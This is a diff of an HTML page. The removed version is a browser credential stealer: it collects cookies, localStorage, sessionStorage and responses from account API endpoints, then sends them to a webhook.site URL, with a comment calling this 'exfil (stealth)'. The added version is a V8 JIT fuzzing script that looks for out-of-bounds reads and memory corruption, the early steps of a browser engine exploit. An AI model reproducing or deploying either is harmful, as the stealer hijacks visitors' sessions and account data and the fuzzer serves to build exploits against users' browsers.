@@ -1,83 +1,127 @@
-<!DOCTYPE html>
-<html>
-<body>
+<!doctype html>
+<meta charset="utf-8">
+<title>V8 SNAP Leak Detector</title>
+
+<pre id="log"></pre>
 <script>
-(async () => {
-  try {
-    let results = [];
+const log = m => {
+  document.getElementById("log").textContent += m + "\n";
+  console.log(m);
+};
 
-    // helper aman
-    const safe = (label, data) => {
-      if (data) results.push(`=== ${label} ===\n${data}`);
-    };
+function vuln(a,i){ return a[i] + 1.1; }
 
-    // COOKIE
-    try {
-      safe("COOKIE", document.cookie);
-    } catch(e) {}
+// ===== WARMUP =====
+function warmup(){
+  let arr = Array.from({length:40}, (_,i)=>i+0.5);
+  for(let i=0;i<80000;i++) vuln(arr, i%40);
+  return arr;
+}
 
-    // LOCAL STORAGE
-    try {
-      let ls = "";
-      for (let i = 0; i < localStorage.length; i++) {
-        let k = localStorage.key(i);
-        ls += k + "=" + localStorage.getItem(k) + "\n";
+// ===== MUTATION =====
+function mutate(arr){
+  delete arr[0];
+  delete arr[1];
+  delete arr[2];
+
+  arr.length = 10;
+  arr[70] = 13.37;
+
+  arr[2] = {x:1};
+
+  let c = 0;
+  Object.defineProperty(arr,3,{
+    get(){
+      if(c++ < 3){
+        arr.push(99.99 + c);
       }
-      safe("LOCALSTORAGE", ls);
-    } catch(e) {}
+      return 1.1;
+    }
+  });
 
-    // SESSION STORAGE
-    try {
-      let ss = "";
-      for (let i = 0; i < sessionStorage.length; i++) {
-        let k = sessionStorage.key(i);
-        ss += k + "=" + sessionStorage.getItem(k) + "\n";
+  return arr;
+}
+
+// ===== PROXY =====
+function breakAssumption(a){
+  let flip = 0;
+  return new Proxy(a,{
+    get(t,p){
+      if(p==="length" && (flip++ % 2 === 0)){
+        t.push(77.77);
       }
-      safe("SESSIONSTORAGE", ss);
-    } catch(e) {}
+      return Reflect.get(t,p);
+    }
+  });
+}
 
-    // endpoint probing (same-origin only)
-    const paths = [
-      "/api/user",
-      "/api/profile",
-      "/api/account",
-      "/api/me",
-      "/user",
-      "/profile"
-    ];
+// ===== TYPED ARRAY =====
+let buf = new ArrayBuffer(0x2000);
+let f64 = new Float64Array(buf);
 
-    for (let p of paths) {
-      try {
-        let r = await fetch(p, {
-          credentials: "include",
-          cache: "no-store"
-        });
+// baseline kuat
+for(let i=0;i<f64.length;i++){
+  f64[i] = 1000 + i;
+}
 
-        if (r.ok) {
-          let t = await r.text();
-          safe(p, t.slice(0, 2000)); // batasi ukuran
-        }
-      } catch(e) {}
+// ===== SNAP CHECK =====
+function snapCheck(arr){
+
+  // 🔥 OOB check
+  for(let i=0;i<50;i++){
+    let v = arr[arr.length + i];
+
+    if(v !== undefined){
+      log("[SNAP OOB] idx="+(arr.length+i)+" val="+v);
+      return true;
     }
 
-    // gabungkan hasil
-    const finalData = results.join("\n\n");
+    if(typeof v === "number" && Math.abs(v) > 1e12){
+      log("[SNAP PTR] "+v);
+      return true;
+    }
+  }
 
-    if (!finalData) return;
+  // 🔥 typed array corruption
+  for(let i=0;i<100;i++){
+    let v = f64[i];
+    if(v !== 1000 + i){
+      log("[SNAP CORRUPTION] idx="+i+" val="+v);
+      return true;
+    }
+  }
 
-    const blob = new Blob([finalData], {type:"text/plain"});
+  return false;
+}
 
-    // exfil (stealth)
-    if (!navigator.sendBeacon("https://webhook.site/f00a5dc8-4452-4a1b-b1c5-ea55838c0b19", blob)) {
-      await fetch("https://webhook.site/f00a5dc8-4452-4a1b-b1c5-ea55838c0b19", {
-        method: "POST",
-        mode: "no-cors",
-        body: blob
-      });
+// ===== MAIN =====
+function run(){
+  log("[*] warmup");
+  let base = warmup();
+
+  log("[*] fuzz start");
+
+  for(let i=0;i<20000;i++){
+    let arr = [...base];
+    arr = mutate(arr);
+    arr = breakAssumption(arr);
+
+    let r = vuln(arr,10);
+
+    if(Number.isNaN(r)){
+      log("[NaN] iteration "+i);
     }
 
-  } catch(e) {}
-})();
+    if(snapCheck(arr)){
+      log("[🔥 SNAP TRIGGERED]");
+      return;
+    }
+
+    if(i % 1000 === 0) log("iter "+i);
+  }
+
+  log("[*] done (no anomaly)");
+}
+
+run();
 </script>
-</body>
-</html>
